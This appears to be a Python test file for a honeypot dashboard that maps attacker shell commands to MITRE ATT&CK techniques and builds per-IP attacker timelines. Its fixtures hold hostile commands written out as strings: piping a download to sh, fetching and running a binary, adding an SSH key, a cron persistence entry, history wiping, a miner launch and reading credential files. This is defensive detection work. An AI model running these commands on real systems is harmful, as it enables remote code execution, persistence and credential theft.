# 0.31 ATT&CK techniques in commands and the attacker timeline across services.
import hashlib, time, unittest

from tests.helpers import app

IP = "198.51.100.191"
NOW = time.time()


class Attack(unittest.TestCase):
    def test_techniques(self):
        cases = {
            "uname -s -v -n -r -m": ["T1082"], "cat /proc/cpuinfo | grep name": ["T1082"], "whoami": ["T1033"], "w": ["T1033"],
            "cd /tmp; wget http://x/a -O a; chmod +x a; ./a": ["T1105", "T1222.002"], "curl -s http://x | sh": ["T1105", "T1059.004"],
            "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys": ["T1098.004"], "(crontab -l; echo '* * * * * /tmp/a') | crontab -": ["T1053.003"],
            "history -c; rm -rf ~/.bash_history": ["T1070.003"], "./xmrig --donate-level 1 -o stratum+tcp://pool": ["T1496"],
            "cat ~/.my.cnf; cat /var/www/portal/.env": ["T1552.001"], "iptables -F": ["T1562.004"], "chmod 644 x": [], "ls -la": [],
            "echo 'id'": [], "cat .bash_history": [],
        }
        for cmd, want in cases.items():
            self.assertEqual(app.attack_ids([cmd]), want, cmd)
        self.assertEqual(app.attack_ids([], logins_fail=5, proxy=1, files=1), ["T1105", "T1110", "T1090"])

    def test_chips(self):
        html = app.attack_chips(["T1098.004", "T1105"])
        self.assertIn('href="https://attack.mitre.org/techniques/T1098/004/"', html)
        self.assertIn('href="https://attack.mitre.org/techniques/T1105/"', html)
        self.assertIn('rel="noopener noreferrer"', html)
        self.assertIn('title="SSH Authorized Keys"', html)
        self.assertIn("+2", app.attack_chips(["T1082", "T1033", "T1057", "T1016", "T1105", "T1496", "T1090", "T1110"]))

    def test_no_slow_regex(self):
        probes = [ch * 3000 for ch in "a ;|&/.-+x\t"] + ["rm " + "a" * 5000, "chmod " + "7" * 5000, "ip " * 2000, "sh -c " * 1000]
        for _t, _n, rx in app.ATTACK_RE:
            for p in probes:
                t = time.perf_counter()
                rx.search(p)
                self.assertLess(time.perf_counter() - t, 0.05, _t)


class Timeline(unittest.TestCase):
    def setUp(self):
        self.con = app.connect()
        self.clean()

    def tearDown(self):
        self.clean()

    def clean(self):
        with self.con:
            for t in ("events", "sessions", "ips", "webhits", "seen"):
                self.con.execute("DELETE FROM %s" % t)

    def row(self, ts, src, kind, session=None, a=None, b=None):
        r = (ts, IP, src, kind, session, a, b)
        return (hashlib.sha1(repr(r).encode()).hexdigest(),) + r

    def test_steps_and_page(self):
        t0 = NOW - 5 * 3600
        rows = [self.row(t0 + i * 60, "canary", "canary", None, "http", "GET /.env (404)") for i in range(4)]
        rows += [self.row(t0 + 1800, "endlessh", "tarpit", None, "600", "22")]
        rows += [self.row(t0 + 7200, "cowrie", "connect", "tl000001", "ssh", "2225"),
                 self.row(t0 + 7201, "cowrie", "login_fail", "tl000001", "root", "a"),
                 self.row(t0 + 7202, "cowrie", "login_fail", "tl000001", "root", "b"),
                 self.row(t0 + 7203, "cowrie", "login_fail", "tl000001", "root", "c"),
                 self.row(t0 + 7204, "cowrie", "login_ok", "tl000001", "root", "d"),
                 self.row(t0 + 7205, "cowrie", "cmd", "tl000001", "uname -a; wget http://x/<b>a</b>; chmod +x a", None),
                 self.row(t0 + 7206, "cowrie", "exec_sim", "tl000001", "/tmp/a", "ab" * 32),
                 self.row(t0 + 7210, "cowrie", "closed", "tl000001", "10", None)]
        app.store(self.con, rows)
        with self.con:
            self.con.execute("INSERT INTO webhits VALUES('w1',?,?,'exploit','x','CVE-2021-41773',9,'r',0,'')", (IP, t0 + 60))
        html = app.ip_timeline(self.con, IP)
        self.assertIn("Web: 4 requests, 1 exploit (CVE-2021-41773)", html)
        self.assertIn("Tarpit: held for 10m", html)
        self.assertIn("1 session with 1 command", html)
        self.assertIn("ran an uploaded program (simulated)", html)
        for t in ("T1082", "T1105", "T1222.002", "T1110"):
            self.assertIn(">%s<" % t, html)
        self.assertLess(html.index("Web:"), html.index("Tarpit:"))
        self.assertLess(html.index("Tarpit:"), html.index("command"))
        self.assertIn('class="tag t-red">Payload<', html)
        self.assertNotIn("<b>a</b>", html)
        page = app.v_ip(IP)
        self.assertIn("<h3>Timeline", page)
        self.assertLess(page.index("<h3>Timeline"), page.index('id="sessions"'))
        self.assertIn('href="https://attack.mitre.org/techniques/T1105/"', page)       # chips on the session too

    def test_single_step_has_no_timeline(self):
        app.store(self.con, [self.row(NOW - 600, "canary", "canary", None, "vnc", " / pw")])
        self.assertEqual(app.ip_timeline(self.con, IP), "")


if __name__ == "__main__":
    unittest.main()
